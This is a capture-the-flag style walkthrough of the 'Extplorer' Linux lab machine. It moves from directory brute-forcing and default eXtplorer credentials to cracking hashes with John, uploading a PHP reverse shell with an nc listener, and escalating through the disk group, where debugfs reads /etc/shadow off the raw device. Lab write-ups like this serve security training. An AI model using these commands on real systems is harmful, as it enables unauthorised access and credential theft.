#Linux #Gobuster #DefaultCreds #john #credentialhunting #LinuxGroups #diskgroup #debugfs #infodisclosure

## Overview

Extplorer is a Linux machine that rewards patient web enumeration and then teaches one of the more elegant Linux privilege escalations: abusing membership in the `disk` group. The chain runs web directory brute force, a file manager protected only by default credentials, credentials hunted out of a config file on disk, a reverse shell as `www-data`, a lateral move to a real user, and finally a raw-disk read of `/etc/shadow` via `debugfs` because that user sits in the `disk` group.

## Recon

The web root just redirects into a WordPress setup wizard, which is a hint that more is mounted alongside it. So I brute-forced directories:

```sh
gobuster dir -u http://192.168.176.16 -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
/filemanager          (Status: 301) [--> /filemanager/]
/wordpress            (Status: 301) [--> /wordpress/]
/wp-admin             (Status: 301) [--> /wp-admin/]
/wp-content           (Status: 301)
/wp-includes          (Status: 301)
```

`/wordpress` is expected, but `/filemanager` is the interesting one, a separate application bolted onto the same host.

## Foothold

### Default Credentials on eXtplorer

`/filemanager` serves an **eXtplorer** login. Before reaching for exploits, the cheapest attack on any admin panel is the vendor's default login, and it worked:

```
admin : admin
```

> **Why default creds keep working:** appliance-style web apps ship with a documented default account so the first boot isn't locked out. Admins are supposed to change it during setup; on a surprising number of real systems they never do. It costs one request to check, so it's always step one.

### Hunting Credentials in the Config

eXtplorer stores its own user database in a PHP file, and as an authenticated admin I could read it directly through the file manager:

```php
// /filemanager/config/.htusers.php
$GLOBALS["users"]=array(
  array('admin','21232f297a57a5a743894a0e4a801fc3', ...),
  array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS', ...),
);
```

The `admin` entry is an MD5 of "admin", but `dora` carries a bcrypt hash (`$2a$`), a real user worth cracking. I copied it out and fed it to John:

```sh
john dora.hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
‹redacted›         (?)
```

Giving me:

```
dora : ‹redacted›
```

### Reverse Shell as www-data

`dora`'s password didn't work over SSH (no shell permissions), so I used eXtplorer's upload feature to plant a PHP reverse shell in the web root and triggered it:

```sh
http://192.168.176.16/wp-admin/php-reverse-shell.php
```

```sh
rlwrap nc -lvnp 53
connect to [...] from [...]
$ whoami
www-data
```

> **Foothold vs. user:** landing as `www-data` is just the web server's identity, deliberately low-privilege. But I already had `dora`'s cleartext password, so the next move was to *become a real user* whose group memberships might be more interesting.

I switched to `dora` with the cracked password and upgraded to a proper TTY:

```sh
su dora
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### The disk Group → Reading /etc/shadow with debugfs

The first thing to check after switching users is `id`:

```sh
dora@dora:/$ id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
```

`dora` belongs to group `6(disk)`. That's the whole escalation.

> **Why `disk` group equals root:** members of `disk` get read/write access to the block devices in `/dev` (like `/dev/sda`). The filesystem's permission model, users, groups, root, lives *inside* the filesystem. If you can read the raw device under it, none of those permissions apply. `debugfs` is a filesystem debugger that opens the block device directly, so a `disk`-group user can read any file on the partition, including `/etc/shadow`, completely bypassing file ownership.

First I found where `/` is mounted:

```sh
dora@dora:~$ df -h
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.3G  55% /
```

Then opened that device with `debugfs` and read the shadow file straight off the disk:

```sh
dora@dora:/$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs:  cat /etc/shadow
root:‹redacted›:19453:0:99999:7:::
...
dora:‹redacted›:19453:0:99999:7:::
```

### Cracking root

With root's `$6$` (sha512crypt) hash in hand, John did the rest:

```sh
john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
‹redacted›         (root)
```

## Root

I re-established my `www-data` shell, then `su`'d straight to root with the cracked password:

```sh
$ su root
Password: ‹redacted›
# whoami
root
# cat /root/proof.txt
‹redacted›
```

## Takeaways

- **Enumerate every directory, not just the obvious app.** The WordPress redirect was a decoy; `/filemanager` was the real door.
- **Default credentials before exploits.** `admin:admin` saved a lot of time.
- **`id` is the first privesc command.** Membership in `disk` (also `adm`, `lxd`, `docker`, `shadow`) is effectively root because it bypasses the filesystem permission layer. `debugfs` turns raw-disk read into an `/etc/shadow` dump.
